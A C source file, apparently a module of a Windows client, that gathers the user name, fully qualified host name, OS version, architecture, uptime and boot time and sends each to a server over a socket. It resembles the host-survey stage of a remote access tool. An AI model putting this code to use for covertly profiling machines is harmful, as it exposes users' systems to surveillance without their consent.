#include "get-user-info.h"

int send_data_to_server(SOCKET target_sock, const wchar_t *label, const wchar_t *value) {
    wchar_t buffer[512];

    _snwprintf_s(buffer, _countof(buffer), _TRUNCATE, L"%ls: %ls", label, value);

    int bytesToSend = (wcslen(buffer) + 1) * sizeof(wchar_t);
    int sentResult = send(target_sock, (const char *)buffer, bytesToSend, 0);

    if (sentResult == SOCKET_ERROR) {
        wchar_t errorLog[256];
        _snwprintf_s(errorLog, _countof(errorLog), _TRUNCATE, L"Error: Socket send failed (%ls). Error Code: %d\n", label, WSAGetLastError());
        OutputDebugStringW(errorLog);
        return EXIT_FAILURE;
    }

    wprintf(L"Sent -> %ls: %ls\n", label, value);

    return EXIT_SUCCESS;
}

int send_username_to_server(SOCKET target_sock) {
    wchar_t userName[UNLEN + 1];
    DWORD unLen = UNLEN + 1;

    if (GetUserNameW(userName, &unLen)) {
        return send_data_to_server(target_sock, L"Username", userName);
    }

    wchar_t errorLog[128];
    swprintf_s(errorLog, _countof(errorLog), L"Error: GetUserNameW failed. Error Code: %lu\n", GetLastError());
    OutputDebugStringW(errorLog);

    return EXIT_FAILURE;
}

int send_fqdn_to_server(SOCKET target_sock) {
    DWORD dwSize = 0;

    if (!GetComputerNameExW(ComputerNameDnsFullyQualified, NULL, &dwSize)) {
        if (GetLastError() == ERROR_MORE_DATA && dwSize > 0) {
            wchar_t *fqdn = (wchar_t *)malloc(dwSize * sizeof(wchar_t));

            if (fqdn != NULL) {
                if (GetComputerNameExW(ComputerNameDnsFullyQualified, fqdn, &dwSize)) {
                    int result = send_data_to_server(target_sock, L"Hostname/FQDN", fqdn);
                    free(fqdn);
                    return result;
                }
                free(fqdn);
            }
        }
    }

    wchar_t errorLog[128];
    swprintf_s(errorLog, _countof(errorLog), L"Error: GetComputerNameExW (FQDN) failed. Error Code: %lu\n", GetLastError());
    OutputDebugStringW(errorLog);

    return EXIT_FAILURE;
}

typedef LONG(WINAPI *RtlGetVersionPtr)(POSVERSIONINFOEXW);

int send_os_version_to_server(SOCKET target_sock) {
    HMODULE hMod = GetModuleHandleW(L"ntdll.dll");

    if (hMod != NULL) {
        RtlGetVersionPtr RtlGetVersion = (RtlGetVersionPtr)GetProcAddress(hMod, "RtlGetVersion");

        if (RtlGetVersion != NULL) {
            OSVERSIONINFOEXW osInfo = { 0 };
            osInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXW);

            if (RtlGetVersion(&osInfo) == 0) {
                wchar_t osVersionStr[128];
                const wchar_t *osName = L"Unknown OS";

                if (osInfo.dwMajorVersion == 10 && osInfo.dwMinorVersion == 0) {
                    if (osInfo.dwBuildNumber >= 22000) {
                        osName = L"Windows 11";
                    }
                    else {
                        osName = L"Windows 10";
                    }
                }
                else if (osInfo.dwMajorVersion == 6 && osInfo.dwMinorVersion == 3) {
                    osName = L"Windows 8.1";
                }
                else if (osInfo.dwMajorVersion == 6 && osInfo.dwMinorVersion == 2) {
                    osName = L"Windows 8";
                }
                else if (osInfo.dwMajorVersion == 6 && osInfo.dwMinorVersion == 1) {
                    osName = L"Windows 7";
                }
                else {
                    osName = L"Old Windows Version";
                }

                _snwprintf_s(osVersionStr, _countof(osVersionStr), _TRUNCATE, L"%ls (Build %lu)", osName, osInfo.dwBuildNumber);

                return send_data_to_server(target_sock, L"OS", osVersionStr);
            }
        }
    }

    wchar_t errorLog[128];
    swprintf_s(errorLog, _countof(errorLog), L"Error: RtlGetVersion failed. Error Code: %lu\n", GetLastError());
    OutputDebugStringW(errorLog);

    return EXIT_FAILURE;
}

int send_os_architecture_to_server(SOCKET target_sock) {
    SYSTEM_INFO sysInfo;

    GetNativeSystemInfo(&sysInfo);

    const wchar_t *archStr = L"Unknown";

    switch (sysInfo.wProcessorArchitecture) {
    case PROCESSOR_ARCHITECTURE_AMD64:
        archStr = L"64-bit (x64)";
        break;
    case PROCESSOR_ARCHITECTURE_ARM64:
        archStr = L"64-bit (ARM64)";
        break;
    case PROCESSOR_ARCHITECTURE_INTEL:
        archStr = L"32-bit (x86)";
        break;
    case PROCESSOR_ARCHITECTURE_ARM:
        archStr = L"32-bit (ARM)";
        break;
    case PROCESSOR_ARCHITECTURE_IA64:
        archStr = L"64-bit (Itanium)";
        break;
    default:
        archStr = L"Unknown Architecture";
        break;
    }

    return send_data_to_server(target_sock, L"OS Architecture", archStr);
}

int send_uptime_to_server(SOCKET target_sock) {
    ULONGLONG uptimeMs = GetTickCount64();

    ULONGLONG seconds = (uptimeMs / 1000) % 60;
    ULONGLONG minutes = (uptimeMs / (1000 * 60)) % 60;
    ULONGLONG hours = (uptimeMs / (1000 * 60 * 60)) % 24;
    ULONGLONG days = uptimeMs / (1000 * 60 * 60 * 24);

    wchar_t uptimeStr[128];
    _snwprintf_s(uptimeStr, _countof(uptimeStr), _TRUNCATE,
        L"%llu Days, %llu Hours, %llu Minutes, %llu Seconds",
        days, hours, minutes, seconds);

    return send_data_to_server(target_sock, L"Uptime", uptimeStr);
}

int send_boot_time_to_server(SOCKET target_sock) {
    ULONGLONG uptimeMs = GetTickCount64();

    FILETIME ftNow;
    GetSystemTimeAsFileTime(&ftNow);

    ULARGE_INTEGER uliNow;
    uliNow.LowPart = ftNow.dwLowDateTime;
    uliNow.HighPart = ftNow.dwHighDateTime;

    ULARGE_INTEGER uliBoot;
    uliBoot.QuadPart = uliNow.QuadPart - (uptimeMs * 10000ULL);

    FILETIME ftBoot;
    ftBoot.dwLowDateTime = uliBoot.LowPart;
    ftBoot.dwHighDateTime = uliBoot.HighPart;

    FILETIME ftLocalBoot;
    FileTimeToLocalFileTime(&ftBoot, &ftLocalBoot);

    SYSTEMTIME stBoot;
    FileTimeToSystemTime(&ftLocalBoot, &stBoot);

    wchar_t bootTimeStr[128];
    _snwprintf_s(bootTimeStr, _countof(bootTimeStr), _TRUNCATE,
        L"%02d.%02d.%04d %02d:%02d:%02d",
        stBoot.wDay, stBoot.wMonth, stBoot.wYear,
        stBoot.wHour, stBoot.wMinute, stBoot.wSecond);

    return send_data_to_server(target_sock, L"Boot Time", bootTimeStr);
}
